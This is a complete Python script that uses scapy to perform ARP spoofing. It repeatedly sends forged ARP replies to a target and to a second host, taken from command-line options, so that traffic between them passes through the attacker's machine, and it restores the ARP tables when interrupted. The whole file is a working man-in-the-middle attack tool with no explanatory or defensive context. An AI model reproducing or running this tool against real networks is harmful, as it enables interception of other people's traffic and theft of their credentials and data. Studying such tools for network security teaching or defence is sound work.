#!/usr/bin/env python

import scapy.all as scapy
import optparse
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    return answered[0][1].hwsrc


def spoof(ip, spoof):
    target_mac = get_mac(ip)
    packet = scapy.ARP(op=2, pdst=ip, hwdst=target_mac, psrc=spoof)
    scapy.send(packet, verbose=False)


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="ip", help="target IP")
    parser.add_option("-s", "--spoof", dest="spoof", help="spoof IP")
    (options, arguments) = parser.parse_args()
    return options


def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, hwsrc=source_mac, psrc=source_ip)
    scapy.send(packet, count=4, verbose=False)


ip = get_arguments().ip
spoofed = get_arguments().spoof
sent_packets = 0

try:
    while True:
        sent_packets+=2
        spoof(ip, spoofed)
        spoof(spoofed, ip)
        print("\r[+] Sent "+str(sent_packets)+" packets", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Quitting...")
    restore(ip, spoofed)

